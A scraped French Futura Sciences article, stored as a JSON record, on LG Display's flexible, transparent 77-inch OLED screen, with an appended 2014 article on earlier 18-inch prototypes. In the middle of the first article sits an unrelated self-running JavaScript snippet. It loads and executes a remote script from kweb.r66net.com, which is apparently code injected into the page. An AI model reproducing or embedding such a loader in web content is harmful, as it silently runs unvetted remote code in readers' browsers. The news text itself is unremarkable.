{"title": "LG devoile un ecran Oled geant souple et transparent", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-06-26", "content": "Le constructeur coreen LG Display offre une nouvelle demonstration de sa maitrise des technologies d'affichage avec un ecran Oled Ultra HD de 77 pouces, a la fois souple et transparent. En 2014,  LG Display  devoilait deux prototypes d' ecrans Oled . L'un offrant un taux de transparence de 30 %, l'autre flexible, pouvant supporter un rayon de courbure de 30R. A l'epoque, le constructeur sud-coreen promettait d'unir ces deux technologies et de proposer des ecrans Oled  Ultra HD  flexibles et transparents pour 2017. Promesse tenue puisque l'entreprise vient de devoiler un  ecran Oled  de 77 pouces a la fois flexible et  transparent . Cet ecran unique en son genre peut etre courbe a 80 degres et beneficie d'une transparence de 40 %. Sa resolution Ultra HD affiche 3.840 x 2.160  pixels .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pas encore de projet commercial pour LG Display Est-ce a dire que nous verrons sous peu arriver les premiers televiseurs Oled flexibles et transparents ? C'est peu probable.  LG Display  ne fait aucun commentaire sur ses projets concernant ce type d'ecran. Il est assez vraisemblable qu'il serve dans un premier temps a faire de l'affichage publicitaire et joue un role de vitrine technologique aupres du grand public. D'autres constructeurs sont egalement en course pour faire aboutir ce type d'ecran, que ce soit pour les  smartphones , les  montres connectees  ou les televiseurs.  Samsung  a recemment montre un prototype d'ecran capable de s'etirer et de se plier tandis que  Panasonic  et Sony sont egalement a pied d'oeuvre.  Pour en savoir plus LG devoile deux ecrans 18 pouces, l'un flexible, l'autre transparent Article initial de  Marc Zaffagni , paru le 12/7/2014 Deja tres avance sur les ecrans flexibles et transparents, le constructeur coreen LG Display a devoile deux ecrans Oled de 18 pouces, l'un pouvant supporter un rayon de courbure de 30R, l'autre atteignant un taux de transparence de 30 %. Il promet des ecrans Oled Ultra HD flexibles et transparents pour 2017. LG se rapproche un peu plus de la commercialisation d'ecrans Oled flexibles et transparents. Apres l' ecran flexible de 5 pouces presente l'annee derniere a l'occasion du salon  Society for Information Display , le constructeur vient de presenter un ecran Oled de 18 pouces qui peut etre enroule en un cylindre d'un rayon de trois centimetres sans affecter son fonctionnement. La prouesse n'est pas qu'un exploit tecnique. LG entend bien commercialiser des televiseurs a ecran flexible de plus de 50 pouces dans un avenir proche. Le modele prototype qui vient d'etre devoile offre une definition de 1.200 x 810 pixels. Il a ete fabrique a partir d'un film polyimide, un  polymere  notamment employe pour les cables flexibles reliant l'ecran d'un  ordinateur  portable a son chassis. LG explique que c'est grace au polyimide qu'il est parvenu a reduire l'epaisseur de l'ecran pour atteindre un rayon de courbure de 30R. Mais ce n'est pas la seule innovation... Outre un nouvel ecran flexible, LG a aussi degaine un modele 18 pouces dont le taux de transparence atteint les 30 % la ou les meilleurs ecrans LCD transparents ne sont qu'a 10 %. LG veut produire des ecrans Oled Ultra HD de plus de 60 pouces flexibles et transparent des 2017. (c) LG Display                               Rendez-vous en 2017 Le geant coreen a aussi montre un  ecran  Oled 18 pouces dont le taux de transparence est de 30 %. L'effet de flou, cause par les circuits et les composants, a ete reduit a seulement 2 %. Sachant que les  ecrans LCD  transparents existant n'atteignent que 10 % de transparence, le pas franchi par LG parait consequent. Reste maintenant a reunir les deux technologies pour sortir un ecran Oled ultra flexible et transparent. LG se dit confiant de pouvoir developper des 2017 des ecrans Oled Ultra  HD de plus de 60 pouces, a la fois flexibles avec un rayon de courbure de 100R et avec un taux de transparence de 40 %. A suivre donc... ", "theme": "tech"}